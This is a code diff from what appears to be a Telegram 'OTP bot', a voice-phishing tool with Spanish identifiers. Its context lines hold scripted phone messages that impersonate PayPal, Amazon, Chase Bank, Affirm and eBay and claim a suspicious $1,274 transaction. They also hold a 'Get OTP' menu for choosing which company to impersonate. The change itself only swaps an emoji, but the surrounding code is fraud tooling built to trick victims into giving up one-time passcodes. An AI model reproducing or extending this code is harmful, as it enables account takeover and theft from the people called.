@@ -92,7 +92,7 @@ IVR_MENSAJES = {
 # ─── EMPRESAS ─────────────────────────────────────────────────────────────────
 EMPRESAS = {
     "paypal":    {"nombre": "PayPal",          "emoji": "💰", "mensaje": "Hello, this is PayPal. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
-    "amazon":    {"nombre": "Amazon",          "emoji": "🛍️", "mensaje": "Hello, this is Amazon. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
+    "amazon":    {"nombre": "Amazon",          "emoji": "🛒", "mensaje": "Hello, this is Amazon. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
     "chase":     {"nombre": "Chase Bank",      "emoji": "🏦", "mensaje": "Hello, this is Chase Bank. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
     "affirm":    {"nombre": "Affirm",          "emoji": "🟦", "mensaje": "Hello, this is Affirm. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
     "ebay":      {"nombre": "eBay",            "emoji": "🛒", "mensaje": "Hello, this is eBay. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
@@ -604,7 +604,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if texto in ["🔐 Obtener OTP", "🔐 Get OTP"]:
         keyboard = [
             [InlineKeyboardButton("💰 PayPal", callback_data="empresa|paypal"),
-             InlineKeyboardButton("🛍️ Amazon", callback_data="empresa|amazon")],
+             InlineKeyboardButton("🛒 Amazon", callback_data="empresa|amazon")],
             [InlineKeyboardButton("🏦 Chase", callback_data="empresa|chase"),
              InlineKeyboardButton("🟦 Affirm", callback_data="empresa|affirm")],
             [InlineKeyboardButton("🛒 eBay", callback_data="empresa|ebay"),
